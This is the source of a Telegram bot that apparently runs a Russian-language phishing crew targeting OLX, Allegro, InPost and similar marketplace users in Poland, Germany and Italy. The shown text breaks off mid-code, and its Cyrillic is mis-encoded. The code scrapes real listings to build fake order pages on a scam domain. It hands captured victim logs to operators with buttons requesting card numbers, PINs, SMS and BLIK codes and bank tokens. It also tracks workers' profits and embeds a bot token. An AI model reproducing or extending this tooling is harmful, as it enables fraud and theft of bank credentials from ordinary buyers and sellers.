var { Telegraf, Markup, Scenes, Stage, session, Extra} = require("telegraf")
var { existsSync, readdirSync, writeFileSync, unlinkSync, mkdirSync, readFileSync } = require("fs")
const axios = require("axios")
var convert = require('xml-js');

var bot = new Telegraf("5442108073:AAHps9v16gGPZaLc_y1UAVQfYjIB07S8gbQ")

var cfg = {
    access: "-1001662224278",
    chat: "https://t.me/+dmW6_6RD_eszNjEy",
    profits: "https://t.me/+Iu3aRha_6Ck4NTVi",
    bugs: "-1001648454323"
}

var _local = {
    cp: ["pl", "de", "it"],
    cp_flags: {"pl": "üáµüá±", "de": "üá©üá™", "it": "üáÆüáπ"},
    pldomain: "cicada3301.mobi",

    menu: Markup.inlineKeyboard([
        [
            Markup.button.callback("üáµüá± –ü–æ–ª—å—à–∞", "@country:poland"),
            Markup.button.callback("üá©üá™ –ì–µ—Ä–º–∞–Ω–∏—è", "@country:germany")
        ],
        [
            Markup.button.callback("üáÆüáπ –ò—Ç–∞–ª–∏—è", "@country:italy"),
        ],
        [
            Markup.button.callback("‚òÅÔ∏è –ß–∞—Ç—ã", "chats"),
            Markup.button.callback("üìò –†—É–∫–æ–≤–æ–¥—Å—Ç–≤–æ", "rukovodstvo"),
        ],
        [
            Markup.button.callback("‚ùóÔ∏è –ñ–∞–ª–æ–±–∞ –Ω–∞ –ë–∞–≥/–î–æ–º–µ–Ω", "bug/domain")
        ],
        [
            Markup.button.callback("üë®‚Äçüè´ –ù–∞—Å—Ç–∞–≤–Ω–∏–∫–∏", "mentors")
        ]
    ]),

    tmenu: {
    inline_keyboard: [
        [
            Markup.button.callback("üáµüá± –ü–æ–ª—å—à–∞", "@country:poland"),
            Markup.button.callback("üá©üá™ –ì–µ—Ä–º–∞–Ω–∏—è", "@country:germany")
        ],
        [
            Markup.button.callback("üáÆüáπ –ò—Ç–∞–ª–∏—è", "@country:italy"),
        ],
        [
            Markup.button.callback("‚òÅÔ∏è –ß–∞—Ç—ã", "chats"),
            Markup.button.callback("üìò –†—É–∫–æ–≤–æ–¥—Å—Ç–≤–æ", "rukovodstvo"),
        ],
        [
            Markup.button.callback("‚ùóÔ∏è –ñ–∞–ª–æ–±–∞ –Ω–∞ –ë–∞–≥/–î–æ–º–µ–Ω", "bug/domain")
        ],
        [
            Markup.button.callback("üë®‚Äçüè´ –ù–∞—Å—Ç–∞–≤–Ω–∏–∫–∏", "mentors"),
            Markup.button.callback("üë®‚Äçüë©‚Äçüë¶ –ö–æ–Ω—Ç–∞–∫—Ç—ã", "contacts"),
        ]
    ]},
    countrys: {
        poland: Markup.inlineKeyboard([
            [
                Markup.button.callback("‚ùáÔ∏è OLX", "@goto:olx"),
                Markup.button.callback("‚ùáÔ∏è Inpost", "@goto:inpost"),
            ],
            [
                Markup.button.callback("‚ùáÔ∏è Vinted", "@goto:vinted"),
                Markup.button.callback("‚ùáÔ∏è Poczta Polska", "@goto:poczta-polska"),
            ],
            [
                Markup.button.callback("‚ùáÔ∏è Allegro 1.0", "@goto:alegro"),
                Markup.button.callback("‚ùáÔ∏è Allegro 2.0", "@goto:allegro"),
            ],
            [
                Markup.button.callback("‚ùáÔ∏è DPD", "@goto:olxpl"),
            ],
            
            
            
        ])
    }
}   

function randint(min, max) {
    let rand = min - 0.5 + Math.random() * (max - min + 1);
    return Math.round(rand);
  }

async function createUser(id){
    await mkdirSync("database/maindb/" + id) //UserDir
    await mkdirSync("database/maindb/" + id + "/profits") //Profits Count
    await writeFileSync("database/maindb/" + id + "/tag", `w${randint(111111, 999999)}`) //UserTag example(w123456)
    await writeFileSync("database/maindb/" + id + "/percent", `55`) //Payout Percent
}

function getMentor(id){
    return { 
        tag: readFileSync("database/maindb/" + id + "/tag") 
    }
}

function recentMentor(id){
    let mpr = Number(readFileSync("database/maindb/" + id + "/mpr"))
    let profits = (readdirSync("database/maindb/" + id + "/profits/").length)

    if (profits >= mpr){
        return '–í—ã –º–æ–∂–µ—Ç–µ –æ—Ç–∫–∞–∑–∞—Ç—å—Å—è'
    }else{
        return `–û—Å—Ç–∞–ª–æ—Å—å ${mpr-profits} –ø—Ä–æ—Ñ–∏—Ç–∞.`
    }


}

function getProfits(id){
    if (readdirSync("database/maindb/" + id + "/profits/").length == 0){
        return 0
    }else{
        let profits = 0

        readdirSync("database/maindb/" + id + "/profits/").forEach(cf => {
            profits += Number(readFileSync("database/maindb/" + id + "/profits/" + cf))
        })

        return profits
    }
}

function hand(){

   var rtx = ""
   var anytime = ""

   _local.cp.forEach(_country => {
       if (readdirSync("database/hand/" + _country).length != 0){
            readdirSync("database/hand/" + _country).forEach(_handler => {
                anytime += `@${_handler}, `
            })
            rtx += `${_local.cp_flags[_country]} - ${anytime.substring(0, anytime.length-2)}.\n`
        }else rtx += `${_local.cp_flags[_country]} - –í–±–∏–≤ –ø—É—Å—Ç–æ–π.\n`
   })

   return rtx;
}

const bgd = new Scenes.WizardScene(
    "bgd",
    (ctx) => {
        ctx.reply("<b>-></b> –í–≤–µ–¥–∏—Ç–µ –≤—Å—é —Å—É—Ç—å –∂–∞–ª–æ–±—ã –≤ –æ–¥–Ω–æ–º —Å–æ–æ–±—â–µ–Ω–∏–∏, –ø–æ—Å–ª–µ —Ç–æ–≥–æ –∫–∞–∫ –º—ã –ø–æ–ª—É—á–∏–º –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –º—ã –ø–µ—Ä–µ–¥–∞–¥–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏.\n\n‚ùóÔ∏è –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø—Ä–∏–¥–µ—Ä–∂–∏–≤–∞–π—Ç–µ—Å—å –ø—Ä–∞–≤–∏–ª, –ø—Ä–∏–ª–æ–∂–∏—Ç–µ –¥–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–∞ –≤ –≤–∏–¥–µ –≤–∏–¥–µ–æ –∏–ª–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ –∏–Ω–∞—á–µ –≤–∞—à–∞ –∑–∞—è–≤–∫–∞ –±—É–¥–µ—Ç –ø—Ä–æ–∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∞.", {parse_mode: "HTML", reply_markup: { 
            inline_keyboard: [
                [
                    Markup.button.callback("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")
                ]
            ]
        }})
        ctx.wizard.next()
    },
    async (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("–û—Ç–º–µ–Ω–µ–Ω–æ. –í—ã –º–æ–∂–µ—Ç–µ –≤—ã–∑–≤–∞—Ç—å –º–µ–Ω—é –∫–Ω–æ–ø–∫–æ–π –Ω–∏–∂–µ.", Markup.inlineKeyboard([
            [
                Markup.button.callback("–ú–µ–Ω—é", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        await ctx.forwardMessage(cfg.bugs)
        await bot.telegram.sendMessage(cfg.bugs, "‚òùÔ∏è –ù–∞ –º–æ–º–µ–Ω—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏—è —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å—Ç–æ—è–ª —Ç—ç–≥ @" + ctx.from.username + " (<b>ID: " + ctx.from.id + "</b>)", {parse_mode: "HTML"})
        await ctx.reply("üëç –ú—ã —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–ª–∏ –≤–∞—à—É –∑–∞—è–≤–∫—É —Å—Ç–∞—Ä—à–µ–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏, –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è –µ–µ –æ–±—Ä–∞–±–æ—Ç–∞—é—Ç.")
        await ctx.scene.leave()
    }
)

const register = new Scenes.WizardScene(
    "register", 
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("üå± –û—Ç–∫—É–¥–∞ –≤—ã –æ –Ω–∞—Å —É–∑–Ω–∞–ª–∏?")
        ctx.wizard.next()
    },
    (ctx) => {
        ctx.wizard.state.data.from = ctx.message.text
        ctx.reply("üëÅ –ë—ã–ª –ª–∏ —É –≤–∞—Å –æ–ø—ã—Ç —Ä–∞–±–æ—Ç—ã –≤ –ø–æ–¥–æ–±–Ω—ã—Ö —Å—Ñ–µ—Ä–∞—Ö –¥–µ—è—Ç–µ–ª—å–Ω–æ—Å—Ç–∏?\n\n‚ùóÔ∏è –ï—Å–ª–∏ –æ–ø—ã—Ç –±—ã–ª, –≤ –æ—Ç–≤–µ—Ç –Ω–∞ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–∞–ø–∏—à–∏—Ç–µ –æ—Ç–≤–µ—Ç. –í–Ω–∏–∑—É –≤–∞–º –≤—ã–¥–∞–Ω—ã –∫–Ω–æ–ø–∫–∏ –±—ã—Å—Ç—Ä–æ–≥–æ –æ—Ç–≤–µ—Ç–∞.", Markup.keyboard([
            ["–ù–µ—Ç –æ–ø—ã—Ç–∞."], ["–ï—Å—Ç—å –Ω–µ–±–æ–ª—å—à–æ–π –æ–ø—ã—Ç."], ["–û–±—É—á–∞—é—Å—å"]
        ]).resize())
        ctx.wizard.next()
    },
    (ctx) => {
        ctx.reply("ü§ù –í–∞—à–∞ –∑–∞—è–≤–∫–∞ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏. –î–æ —Å–∫–æ—Ä—ã—Ö –≤—Å—Ç—Ä–µ—á!", {reply_markup: { remove_keyboard: true }})

        bot.telegram.sendMessage(cfg.access, `<b>‚öôÔ∏è –ü—Ä–∏—à–ª–∞ –Ω–æ–≤–∞—è –∑–∞—è–≤–∫–∞ ‚Ññ${readdirSync("database/attempts/").length+1}!</b>\n\n<b>Tag</b>: @${ctx.from.username}\n<b>–û—Ç–∫—É–¥–∞ —É–∑–Ω–∞–ª:</b> ${ctx.wizard.state.data.from}\n<b>–û–ø—ã—Ç</b>: ${ctx.message.text}\n\n\n<code>‚ùóÔ∏è –î–ª—è –≤—ã–Ω–µ—Å–µ–Ω–∏—è –≤–µ—Ä–¥–∏–∫—Ç–∞ –Ω–∞–∂–º–∏—Ç–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ.</code>`, {parse_mode: "HTML", reply_markup: { 
            inline_keyboard: [
                [
                    Markup.button.callback("‚úÖ –ü—Ä–∏–Ω—è—Ç—å", "@accept:" + ctx.from.id),
                    Markup.button.callback("‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", "@disaccept:" + ctx.from.id),
                ],
                [
                    Markup.button.callback("‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å + –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", "@disblock:" + ctx.from.id),
                ],
            ]
        }})

        writeFileSync("database/attempts/" + ctx.from.id, "1")
        
        ctx.scene.leave()
    }
)

async function parse_link(link) {

    if (link.includes("m.olx.pl")) {
      link = link.replace("m.olx.pl", "www.olx.pl")
    }

    if (link.includes("olx.pl/d/")) {
      link = link.replace("olx.pl/d/", "olx.pl/")
    }
    
    const options = {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36' },
        url: link
    }

    let res = await axios(options);
    let data = res.data;
    var gallery = data.match(/<div class="swiper-zoom-container">(.+)<\/div>/)
    var title = data.match(/<h1 data-cy="ad_title" class="css-r9zjja-Text eu5v0x0">(.+)<\/h1>/)[1].trim();
    if (typeof data.match(/<h3 class="css-okktvh-Text eu5v0x0">(.+)<\/h3><\/div>/) != undefined) {
        var price = data.match(/<h3 class="css-okktvh-Text eu5v0x0">(.+)<\/h3>/)[1].split("<")[0].replace(/[^0-9]/g, "")
    } else {
        var price = data.match(/<h3 class="css-okktvh-Text eu5v0x0">(.+)<\/h3>/)[1].replace(/[^0-9]/g, "");
    }
    const images = []

    if (title == "" || title == undefined || price == "" || price == undefined) return "404"

    var regular = /src=\"(.*?)\"/g
    do {
        match = regular.exec(gallery)

        if (match) {
            images.push(match[0].match(/src="(.+)"/)[1])
        }
    } while (match)

    const photo = images[0]
    
    if (photo == "undefined") {
        photo = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtvMCg-jkC382cdG9nIYNOmAm0iAksv6vlAhbVLI_AyuuO43Fne-rCYPE3Yo4bZ_oiiqo&usqp=CAU"
    }

    return { title: title, price: price.replace(/\B(?=(\d{3})+(?!\d))/g, " "), image: photo}

}

const olx = new Scenes.WizardScene(
    "olx",
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("‚ùáÔ∏è –í–≤–µ–¥–∏ —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—å—è–≤–ª–µ–Ω–∏–µ.", Markup.inlineKeyboard([
            [
                Markup.button.callback("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    async (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("–û—Ç–º–µ–Ω–µ–Ω–æ. –í—ã –º–æ–∂–µ—Ç–µ –≤—ã–∑–≤–∞—Ç—å –º–µ–Ω—é –∫–Ω–æ–ø–∫–æ–π –Ω–∏–∂–µ.", Markup.inlineKeyboard([
            [
                Markup.button.callback("–ú–µ–Ω—é", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        let adv = await parse_link(ctx.message.text)
        if (adv == "404") return ctx.reply("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–∞—Ä—Å–∏–Ω–≥–µ, —Å—Å—ã–ª–∫–∞ –±–∏—Ç–∞—è. –í—ã –º–æ–∂–µ—Ç–µ –≤—ã–∑–≤–∞—Ç—å –º–µ–Ω—é –∫–Ω–æ–ø–∫–æ–π –Ω–∏–∂–µ.", Markup.inlineKeyboard([
            [
                Markup.button.callback("–ú–µ–Ω—é", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        ctx.wizard.state.data.obyava = adv.title
        ctx.wizard.state.data.price = adv.price
        ctx.wizard.state.data.img = adv.image
        
        if (existsSync("database/savethe/" + ctx.from.id) == false){
            ctx.reply("–£–∫–∞–∂–∏ –ø–æ–ª—É—á–∞—Ç–µ–ª—è.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")
                ]
            ]))
        }else{
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
            ctx.reply("–£–∫–∞–∂–∏ –ø–æ–ª—É—á–∞—Ç–µ–ª—è.", Markup.inlineKeyboard([
                [
                    Markup.button.callback( (json['fio'].length > 10) ? json['fio'].substring(0, 10) + "..." : json['fio'], "fio")
                ],
                [
                    Markup.button.callback("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")
                ]
            ]))  
        }
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined'){
            if (ctx.update.callback_query.data == "cancel"){
            return ctx.reply("–û—Ç–º–µ–Ω–µ–Ω–æ. –í—ã –º–æ–∂–µ—Ç–µ –≤—ã–∑–≤–∞—Ç—å –º–µ–Ω—é –∫–Ω–æ–ø–∫–æ–π –Ω–∏–∂–µ.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("–ú–µ–Ω—é", "callMenu")
                ]
            ])).then(ctx.scene.leave())
        }else{
            ctx.wizard.state.data.fio = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio']
            ctx.reply("‚ùï –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –∏–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio'], {parse_mode: "HTML"})
        }
    }else{
        ctx.wizard.state.data.fio = ctx.message.text
    }
    if (existsSync("database/savethe/" + ctx.from.id) == false){
        ctx.reply("–£–∫–∞–∂–∏ –∞–¥—Ä–µ—Å—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è.", Markup.inlineKeyboard([
            [
                Markup.button.callback("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")
            ]
        ]))
    }else{
        let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
        ctx.reply("–£–∫–∞–∂–∏ –∞–¥—Ä–µ—Å—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è.", Markup.inlineKeyboard([
            [
                Markup.button.callback( (json['to'].length > 10) ? json['to'].substring(0, 10) + "..." : json['to'], "to")
            ],
            [
                Markup.button.callback("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")
            ]
        ]))  
    }
        ctx.wizard.next()
    },
    async (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined'){
            if (ctx.update.callback_query.data == "cancel"){
            return ctx.reply("–û—Ç–º–µ–Ω–µ–Ω–æ. –í—ã –º–æ–∂–µ—Ç–µ –≤—ã–∑–≤–∞—Ç—å –º–µ–Ω—é –∫–Ω–æ–ø–∫–æ–π –Ω–∏–∂–µ.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("–ú–µ–Ω—é", "callMenu")
                ]
            ])).then(ctx.scene.leave())
        }else{
            ctx.wizard.state.data.to = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to']
            ctx.reply("‚ùï –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –∞–¥—Ä–µ—Å—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to'], {parse_mode: "HTML"})
        }
    }else{
        ctx.wizard.state.data.to = ctx.message.text
    }
        let randomc = randint(000000,999999)
    ctx.wizard.state.data['worker_id'] = ctx.from.id
    ctx.wizard.state.data['worker'] = ctx.from.username
    writeFileSync(`../olx/data/${randomc}.xml`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, {compact: true, ignoreComment: true, spaces: 4}) + "\n</xml>" )
    writeFileSync("database/savethe/" + ctx.from.id, JSON.stringify({fio: ctx.wizard.state.data.fio, to: ctx.wizard.state.data.to}))
    ctx.reply(`‚ùáÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ç—Ä–µ–∫ –Ω–æ–º–µ—Ä–µ!\n\n‚ùáÔ∏è –¢—Ä–µ–∫ –Ω–æ–º–µ—Ä: ${randomc}\n‚ùáÔ∏è –ù–∞–∑–≤–∞–Ω–∏–µ: ${ctx.wizard.state.data.obyava}\n‚ùáÔ∏è –°—Ç–æ–∏–º–æ—Å—Ç—å: ${ctx.wizard.state.data.price} PLN\n\nüëâ https://olx.${_local.pldomain}/order.php?id=${randomc}`)
    await ctx.scene.leave()

    }
)



const stage = new Scenes.Stage([
    register, bgd, olx
])

bot.use(session());
bot.use(stage.middleware());


bot.on("callback_query", async (ctx) => {
    let clb = ctx.update.callback_query;

    if (existsSync("database/block/" + ctx.from.id) == true){
        return ctx.reply("–í—ã –±—ã–ª–∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –°–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–µ–π.")
    }

    if (clb.data.substring(0, 10) == "@declined:"){
        let id = clb.data.replace("@declined:", "")
        bot.telegram.sendMessage(id, `‚ö†Ô∏è –í–±–∏–≤–µ—Ä @${ctx.from.username} –ø–æ –æ–±—å—è–≤–ª–µ–Ω–∏—é "${clb.message.text.match(/‚ùáÔ∏è –û–±—å—è–≤–ª–µ–Ω–∏–µ: (.+)/)[1]}" —Å–æ–æ–±—â–∏–ª <b>—á—Ç–æ –º–∞–º–æ–Ω—Ç –æ—Ç–∫–ª–æ–Ω–∏–ª –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–ø–∏—Å–∞–Ω–∏–µ. –ë–æ–ª–µ–µ —Ç–æ—á–Ω–æ –≤—ã –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ—Å–∏—Ç—å —É –≤–±–∏–≤–µ—Ä–∞</b>.`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 9) == "@nomoney:"){
        let id = clb.data.replace("@nomoney:", "")
        bot.telegram.sendMessage(id, `‚ö†Ô∏è –í–±–∏–≤–µ—Ä @${ctx.from.username} –ø–æ –æ–±—å—è–≤–ª–µ–Ω–∏—é "${clb.message.text.match(/‚ùáÔ∏è –û–±—å—è–≤–ª–µ–Ω–∏–µ: (.+)/)[1]}" —Å–æ–æ–±—â–∏–ª —á—Ç–æ <b>—É –º–∞–º–æ–Ω—Ç–∞ –Ω–µ—Ç —Å—Ä–µ–¥—Å—Ç–≤</b>.`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 9) == "@badinfo:"){
        let id = clb.data.replace("@badinfo:", "")
        bot.telegram.sendMessage(id, `‚ö†Ô∏è –í–±–∏–≤–µ—Ä @${ctx.from.username} –ø–æ –æ–±—å—è–≤–ª–µ–Ω–∏—é "${clb.message.text.match(/‚ùáÔ∏è –û–±—å—è–≤–ª–µ–Ω–∏–µ: (.+)/)[1]}" —Å–æ–æ–±—â–∏–ª —á—Ç–æ <b>–º–∞–º–æ–Ω—Ç –≤–≤–µ–ª –Ω–µ –≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ</b>.`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 6) == "@pick:"){
        
        let logname = clb.data.replace("@pick:", "")
        let json = JSON.parse(readFileSync("/var/www/html/logs/" + logname))
        writeFileSync(`/var/www/html/logs_ck/${json['uid']}_${json['worker_id']['0']}`, String(ctx.from.id))
        ctx.editMessageText(clb.message.text + "\nüëâ –í–∑—è–ª –ª–æ–≥ -> @" + ctx.from.username)
        bot.telegram.sendMessage(ctx.from.id, `<b>${clb.message.text.match(/(.+) NEW LOG/)[1]}</b>\n\n<b>‚ùáÔ∏è –õ–æ–∫–∞—Ü–∏—è</b>: ${clb.message.text.match(/‚ùáÔ∏è –õ–æ–∫–∞—Ü–∏—è: (.+)/)[1]}\n<b>‚ùáÔ∏è –û–±—å—è–≤–ª–µ–Ω–∏–µ</b>: ${json['name']['0']}\n<b>‚ùáÔ∏è –°—Ç–æ–∏–º–æ—Å—Ç—å</b>: ${json['price']['0']}\n<b>‚ùáÔ∏è –í–æ—Ä–∫–µ—Ä</b>: ${json['worker']['0']}\n<b>‚ùáÔ∏è –í–æ—Ä–∫–µ—Ä ID</b>: ${json['worker_id']['0']}\n<b>‚ùáÔ∏è –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä</b>: ${json['uid']} / ${json['domain']}\n\n${json['log']}`, {parse_mode: "HTML", reply_markup: {
            inline_keyboard: [
                [
                    Markup.button.callback("–û—Ç–∫–ª–æ–Ω–µ–Ω–æ", "@declined:" + json['worker_id']['0']),
                    Markup.button.callback("–ù–µ—Ç –¥–µ–Ω–µ–≥", "@nomoney:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("–ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ", "@badinfo:" + json['worker_id']['0']),
                    Markup.button.callback("–§—ç–π–∫", "@fakelog:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("–õ–ö", `@lk:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("–¢–æ–∫–µ–Ω", `@pkotoken:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("SMS", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("BLIK", `@blik:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("–ü—É—à", `@lk:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("–ö–∞—Ä—Ç–∞", `@pkotoken:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("PIN", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("‚úÖ –ó–∞–ª–µ—Ç", `@profit:${json['worker_id']['0']}`)
                ]
            ]
        }})
        bot.telegram.sendMessage(json['worker_id']['0'], `${clb.message.text.match(/(.+) NEW LOG/)[1]}\n‚ö†Ô∏è –ó–∞ –≤–±–∏–≤ —Ç–≤–æ–µ–≥–æ –æ–±—å—è–≤–ª–µ–Ω–∏—è ${json['name']['0']} –≤–∑—è–ª—Å—è –≤–±–∏–≤–µ—Ä @${ctx.from.username} ‚ö†Ô∏è`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 6) == "@goto:"){
        try {
        ctx.scene.enter(clb.data.replace("@goto:", ""), ctx.scene.stage)
        }catch (e) {
            ctx.reply("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. " + e)
        }
    }

    if (clb.data.substring(0, 9) == "@wmentor:"){
        let id = clb.data.replace("@wmentor:", "")

        if (existsSync("database/maindb/" + ctx.from.id + "/mentor") == true) return ctx.reply("–£ –≤–∞—Å —É–∂–µ –µ—Å—Ç—å –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫! –í—ã –º–æ–∂–µ—Ç–µ –æ—Ç –Ω–µ–≥–æ –æ—Ç–∫–∞–∑–∞—Ç—å—Å—è –∫–æ–º–∞–Ω–¥–æ–π /leavementor")

        writeFileSync("database/maindb/" + ctx.from.id + "/mpr", String(readdirSync("database/maindb/" + ctx.from.id + "/profits/").length+3))
        writeFileSync("database/maindb/" + ctx.from.id + "/mentor", String(id))
        writeFileSync("database/maindb/" + ctx.from.id + "/percent", String(Number(readFileSync("database/maindb/" + ctx.from.id + "/percent")) - 5))

        bot.telegram.sendMessage(id, "üë®‚Äçüéì –£ –≤–∞—Å –ø–æ—è–≤–∏–ª—Å—è –Ω–æ–≤—ã–π –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫ - @" + ctx.from.username + "! (#" + readFileSync("database/maindb/" + ctx.from.id + "/tag") + ")")
        ctx.reply("üë®‚Äçüéì –û—Ç–ª–∏—á–Ω–æ! –¢–µ–ø–µ—Ä—å –≤—ã —Å—Ç–∞–ª–∏ —É—á–µ–Ω–∏–∫–æ–º #" + readFileSync("database/maindb/" + id + "/tag") + ". –í—ã –º–æ–∂–µ—Ç–µ —Å–≤—è–∑–∞—Ç—å—Å—è —Å –Ω–∏–º —á–µ—Ä–µ–∑ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.", Markup.inlineKeyboard([
            [
                Markup.button.url(`#${readFileSync("database/maindb/" + id + "/tag")}`, "tg://user?id=" + id)
            ]
        ]))
    }

    if (clb.data == "contacts"){
        return ctx.editMessageCaption("üë®‚Äçüë©‚Äçüë¶ –ö–æ–Ω—Ç–∞–∫—Ç—ã\n\nüåç –í–ª–∞–¥–µ–ª–µ—Ü –¢–° :\n@CICADA3301_start\n\nüåê –ñ–∞–ª–æ–±—ã –∏ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏—è :\n@CICADA3301_logistics", Markup.inlineKeyboard([[Markup.button.callback("–ù–∞–∑–∞–¥", "tomenu")]]))
    }
    
    if (clb.data.substring(0, 11) == "@go_mentor:"){
        let id = clb.data.replace("@go_mentor:", "")

        if (existsSync("database/mentors/" + id) == true){
            ctx.editMessageCaption(`üë®‚Äçüè´ #${readFileSync("database/maindb/" + id + "/tag")}\n\n${decodeURIComponent(JSON.parse(readFileSync("database/mentors/" + id))['text'])}`, {reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback("üë®‚Äçüéì –°—Ç–∞—Ç—å —É—á–µ–Ω–∏–∫–æ–º", "@wmentor:" + id),
                        Markup.button.callback("–ù–∞–∑–∞–¥", "mentors"),
                        
                    ]
                ]
            }})
        }else{
            ctx.reply("–î–∞–Ω–Ω—ã–π –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫ –±—ã–ª —É–≤–æ–ª–µ–Ω, –≤–æ–∑–º–æ–∂–Ω–æ –≤–∞–º —Å—Ç–æ–∏—Ç –≤—ã–±—Ä–∞—Ç—å –Ω–æ–≤–æ–≥–æ.")
        }
    }

    if (clb.data == "rukovodstvo"){
        ctx.editMessageCaption("", Markup.inlineKeyboard([
            [
                Markup.button.callback("üì± –ù–æ–º–µ—Ä–∞", "numbers"),
                Markup.button.url("üìö –ú–∞–Ω—É–∞–ª—ã.", "https://t.me/+YRjGkLC2fvYwMzQy"),
            ],
            [
                Markup.button.callback("–ú–µ–Ω—é", "tomenu")
            ]
        ]))
    }

    if (clb.data == "numbers"){
        ctx.editMessageCaption("üì± –ù–æ–º–µ—Ä–∞ –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–∞ –∏ –∞–∫–∫–∞—É–Ω—Ç–æ–≤.\n\n‚úÖ @SMSBest_bot\n‚úÖ onlinesim.ru\n‚úÖ 5sim.net\n‚úÖ @GreedySMSbot\n‚úÖ sms-activate.ru\n‚úÖ @Jeazz19", Markup.inlineKeyboard([
            [
